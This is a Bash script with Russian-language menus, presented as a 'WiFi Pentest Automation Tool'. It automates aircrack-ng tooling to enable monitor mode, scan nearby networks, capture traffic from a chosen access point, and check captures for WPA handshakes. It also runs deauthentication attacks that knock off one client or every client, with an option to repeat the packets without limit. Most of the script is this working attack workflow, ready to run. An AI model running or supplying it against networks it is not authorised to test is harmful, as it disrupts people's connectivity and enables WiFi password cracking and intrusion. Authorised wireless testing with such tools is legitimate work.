#!/bin/bash

# WiFi Pentest Automation Tool
# Запускать от root (sudo)

set -e

INTERFACE="wlan1"
MON_INTERFACE="${INTERFACE}mon"
CAPTURE_DIR="/home/kali/Desktop/wifi_captures"
COLOR_GREEN='\033[0;32m'
COLOR_RED='\033[0;31m'
COLOR_YELLOW='\033[1;33m'
COLOR_RESET='\033[0m'

# Создаём директорию для файлов захвата
mkdir -p "$CAPTURE_DIR"

# Проверка прав
if [[ $EUID -ne 0 ]]; then
    echo -e "${COLOR_RED}[!] Скрипт должен запускаться от root (sudo).${COLOR_RESET}"
    exit 1
fi

# Проверка наличия интерфейса
if ! ip link show "$INTERFACE" &>/dev/null; then
    echo -e "${COLOR_RED}[!] Интерфейс $INTERFACE не найден.${COLOR_RESET}"
    exit 1
fi

# Проверка, запущен ли режим монитора
is_monitor_up() {
    ip link show "$MON_INTERFACE" &>/dev/null
}

# Остановка режима монитора (очистка)
cleanup_monitor() {
    if is_monitor_up; then
        echo -e "${COLOR_YELLOW}[*] Выключаю режим монитора...${COLOR_RESET}"
        airmon-ng stop "$MON_INTERFACE" &>/dev/null
        sleep 1
    fi
}

# Функция для корректного выхода
exit_script() {
    cleanup_monitor
    echo -e "${COLOR_GREEN}[+] Выход.${COLOR_RESET}"
    exit 0
}
trap exit_script INT TERM

# === ФУНКЦИИ МЕНЮ ===

# 1. Сканирование сетей (обзор)
scan_networks() {
    if ! is_monitor_up; then
        echo -e "${COLOR_RED}[!] Режим монитора не запущен. Сначала запустите его (пункт 8).${COLOR_RESET}"
        read -p "Запустить сейчас? (y/N): " START_NOW
        if [[ "$START_NOW" =~ ^[Yy]$ ]]; then
            start_monitor
        else
            return
        fi
    fi
    
    echo -e "${COLOR_GREEN}[+] Сканирование сетей. Нажми Ctrl+C для остановки.${COLOR_RESET}"
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    sudo airodump-ng "$MON_INTERFACE" --write "$CAPTURE_DIR/capture-$TIMESTAMP" --output-format csv &
    AIRODUMP_PID=$!
    
    wait $AIRODUMP_PID 2>/dev/null
    
    # Парсим CSV и выводим красиво
    CSV_FILE="$CAPTURE_DIR/capture-$TIMESTAMP-01.csv"
    if [[ -f "$CSV_FILE" ]]; then
        echo ""
        echo -e "${COLOR_GREEN}[+] Найденные сети:${COLOR_RESET}"
        cat "$CSV_FILE" | grep -E "^[0-9A-Fa-f]{2}:" | awk -F ',' '{printf "%-18s CH:%-3s PWR:%-5s %s\n", $1, $4, $6, $14}'
    fi
}

# 2. Прицельный слушатель (одна сеть)
targeted_listen() {
    if ! is_monitor_up; then
        echo -e "${COLOR_RED}[!] Режим монитора не запущен. Сначала запустите его (пункт 8).${COLOR_RESET}"
        return
    fi
    
    read -p "Канал (CH): " CHANNEL
    read -p "BSSID цели: " BSSID
    read -p "Имя файла для захвата (без расширения): " FILENAME
    
    echo -e "${COLOR_GREEN}[+] Запущен прицельный захват. Нажми Ctrl+C для остановки.${COLOR_RESET}"
    sudo airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$CAPTURE_DIR/$FILENAME" "$MON_INTERFACE"
}

# 3. Деаутентификация
deauth_attack() {
    if ! is_monitor_up; then
        echo -e "${COLOR_RED}[!] Режим монитора не запущен. Сначала запустите его (пункт 8).${COLOR_RESET}"
        return
    fi
    
    read -p "BSSID сети (AP): " BSSID
    read -p "MAC клиента (оставьте пустым для broadcast): " CLIENT
    read -p "Количество пакетов (0 = бесконечно): " COUNT
    
    if [[ -z "$CLIENT" ]]; then
        echo -e "${COLOR_YELLOW}[*] Запуск деаутентификации всех клиентов...${COLOR_RESET}"
        sudo aireplay-ng -0 "$COUNT" -a "$BSSID" "$MON_INTERFACE"
    else
        echo -e "${COLOR_YELLOW}[*] Запуск деаутентификации клиента $CLIENT...${COLOR_RESET}"
        sudo aireplay-ng -0 "$COUNT" -a "$BSSID" -c "$CLIENT" "$MON_INTERFACE"
    fi
}

# 4. Парсинг CSV и вывод сетей
parse_csv() {
    echo -e "${COLOR_YELLOW}[*] Доступные CSV-файлы:${COLOR_RESET}"
    ls -1 "$CAPTURE_DIR"/*.csv 2>/dev/null | head -10
    
    read -p "Введите имя CSV-файла (полный путь или только имя): " CSV_INPUT
    # Если введено только имя - добавляем путь
    if [[ ! "$CSV_INPUT" =~ ^/ ]]; then
        CSV_INPUT="$CAPTURE_DIR/$CSV_INPUT"
    fi
    
    if [[ ! -f "$CSV_INPUT" ]]; then
        echo -e "${COLOR_RED}[!] Файл не найден.${COLOR_RESET}"
        return
    fi
    
    echo -e "${COLOR_GREEN}[+] Результаты:${COLOR_RESET}"
    cat "$CSV_INPUT" | grep -E "^[0-9A-Fa-f]{2}:" | awk -F ',' '{printf "%-18s CH:%-3s Clients:%-5s %s\n", $1, $4, $6, $14}'
}

# 5. Проверка рукопожатия в файле захвата
check_handshake() {
    echo -e "${COLOR_YELLOW}[*] Доступные файлы .cap:${COLOR_RESET}"
    ls -1 "$CAPTURE_DIR"/*.cap 2>/dev/null | head -10
    
    read -p "Введите имя cap-файла (полный путь или только имя): " CAP_INPUT
    if [[ ! "$CAP_INPUT" =~ ^/ ]]; then
        CAP_INPUT="$CAPTURE_DIR/$CAP_INPUT"
    fi
    
    if [[ ! -f "$CAP_INPUT" ]]; then
        echo -e "${COLOR_RED}[!] Файл не найден.${COLOR_RESET}"
        return
    fi
    
    echo -e "${COLOR_YELLOW}[*] Проверка рукопожатия в $CAP_INPUT...${COLOR_RESET}"
    aircrack-ng "$CAP_INPUT" 2>&1 | grep -E "(handshake|WPA|No networks|0 handshake)"
}

# 6. Остановка мониторного режима
stop_monitor() {
    cleanup_monitor
    echo -e "${COLOR_GREEN}[+] Режим монитора остановлен.${COLOR_RESET}"
}

# 7. Показать статус интерфейсов
show_status() {
    echo -e "${COLOR_GREEN}[+] Статус интерфейсов:${COLOR_RESET}"
    iwconfig 2>/dev/null | grep -E "(wlan|mon|IEEE|Mode|Frequency)"
    echo ""
    echo -e "${COLOR_GREEN}[+] Файлы захватов:${COLOR_RESET}"
    ls -lh "$CAPTURE_DIR"/*.cap 2>/dev/null | head -5 || echo "Нет файлов захвата."
}

# 8. Запуск мониторного режима
start_monitor() {
    if is_monitor_up; then
        echo -e "${COLOR_YELLOW}[*] Режим монитора уже запущен ($MON_INTERFACE).${COLOR_RESET}"
        return
    fi
    echo -e "${COLOR_YELLOW}[*] Запускаю режим монитора на $INTERFACE...${COLOR_RESET}"
    airmon-ng start "$INTERFACE" &>/dev/null
    sleep 2
    if is_monitor_up; then
        echo -e "${COLOR_GREEN}[+] Режим монитора запущен: $MON_INTERFACE${COLOR_RESET}"
    else
        echo -e "${COLOR_RED}[!] Не удалось запустить режим монитора.${COLOR_RESET}"
    fi
}

# === ГЛАВНОЕ МЕНЮ ===
show_menu() {
    clear   
    echo -e "${COLOR_GREEN}╔══════════════════════════════════════════════╗${COLOR_RESET}"
    echo -e "${COLOR_GREEN}║                                              ║${COLOR_RESET}"
    echo -e "${COLOR_RED}
            ⣾⣿⣿⣿⣿⣷⢸⣿⣿⡜⢯⣷⡌⡻⣿⣿⣿⣆⢈⠻⠿⢿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡁⢳⣿⣿⣿⣿⣿⣿⡜⣿⣿⣧⢀⢻⣷⠰⠈⢿⣿⣿⣧⢣⠉⠑⠪⢙⠿⠿⠿⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣱⡇⡞⣿⣿⣿⣿⣿⣿⡇⣿⣿⡏⡄⣧⠹⡇⠧⠈⢻⣿⣿⡇⢧⢢⠀⠀⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣇⢃⢿⣿⣿⣿⣿⣿⣷⣿⣿⠇⢃⣡⣤⡹⠐⣿⣀⢻⣿⣿⢸⡎⠳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣾⣿⣿⠘⡸⣿⣿⣿⣿⣿⣿⣿⡿⣰⣿⣿⢟⡷⠈⠋⠃⠎⢿⣿⡏⣿⠀⠘⢆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡐⢹⣿⣿⡐⢡⢹⣿⣿⣿⣿⡏⣿⢣⣿⣿⡑⠁⠔⠀⠉⠉⠢⡘⣿⡇⣿⡇⠀⡀⠡⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠘⣿⣿⣇⠇⢣⢻⣿⣿⣿⡇⢇⣾⣿⣿⡆⢸⣤⡀⠚⢂⠀⢡⢿⡇⣿⡇⠀⢿⠀⠀⠄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠠⠹⣿⣿⡘⣆⢣⠻⣿⣿⢈⣾⣿⣿⣿⣶⣸⣏⢀⣬⣋⡼⣠⢸⢹⣿⡇⢠⣼⠙⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠁⠹⣿⣇⠹⡃⠃⠙⡇⠘⢿⣿⣿⣿⣿⣿⣏⣓⣉⣭⣴⣿⠘⢸⣿⠁⠘⠋⠀⠹⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠀⠈⢿⣇⠂⣷⠄⠐⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢠⢸⡏⠀⢀⣠⣴⣾⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠀⠙⠆⠈⠢⠲⠥⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡞⣸⠁⠀⢸⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠄⠃⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⡏⠹⣿⣿⡿⠫⠊⠀⠀⠀⣶⠀⢻⣿⣿⣿⣿⡿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠿⠿⠿⢋⠀⠀⠀⠀⢀⣼⣿⡆⠈⣿⣿⣿⡟⣱⡷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⣁⡀⠨⣛⠿⠶⠄⢀⣠⣾⣿⣿⣷⠀⢹⣿⡟⣴⠈⢃⣶⠔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⡄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⣿⣿⡿⠀⡀⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢙⠻⣿⣿⢀⠙⠻⠿⣿⣿⣿⣿⣿⣿⡇⠁⣿⠟⡀⠈⣧⢰⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⠴⠮⣥⠻⢧⣤⣄⣀⡉⢩⣭⣍⣃⣀⣩⠎⢀⣼⠉⣼⡯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠁⣛⠓⢒⣒⣢⡭⢁⡈⠿⠿⠟⠹⠛⠁⠀⠀⠀⠰⠃⠂⠀⠀⠀${COLOR_RESET}"
    echo -e "${COLOR_GREEN}║                                              ║${COLOR_RESET}"
    echo -e "${COLOR_GREEN}╠══════════════════════════════════════════════╣${COLOR_RESET}"
    echo -e "${COLOR_GREEN}║         WiFi Pentest Automation Tool         ║${COLOR_RESET}"
    echo -e "${COLOR_GREEN}║     Author: qribix | github.com/qribix       ║${COLOR_RESET}"
    echo -e "${COLOR_GREEN}║               Version: 1.0                   ║${COLOR_RESET}"
    echo -e "${COLOR_GREEN}╚══════════════════════════════════════════════╝${COLOR_RESET}"
    echo "1. Сканирование сетей (обзор)"
    echo "2. Прицельный слушатель (одна сеть)"
    echo "3. Деаутентификация (отключение клиентов)"
    echo "4. Парсинг CSV и вывод сетей"
    echo "5. Проверка рукопожатия (aircrack-ng)"
    echo "6. Остановить режим монитора"
    echo "7. Показать статус"
    echo "8. Запустить режим монитора"
    echo "0. Выход"
    echo -e "${COLOR_GREEN}----------------------------------------${COLOR_RESET}"
    read -p "Выберите пункт: " CHOICE
    
    case $CHOICE in
        1) scan_networks ;;
        2) targeted_listen ;;
        3) deauth_attack ;;
        4) parse_csv ;;
        5) check_handshake ;;
        6) stop_monitor ;;
        7) show_status ;;
        8) start_monitor ;;
        0) exit_script ;;
        *) echo -e "${COLOR_RED}[!] Неверный выбор.${COLOR_RESET}"; sleep 1 ;;
    esac
    
    echo ""
    read -p "Нажмите Enter для продолжения..."
}

# Основной цикл
while true; do
    show_menu
done
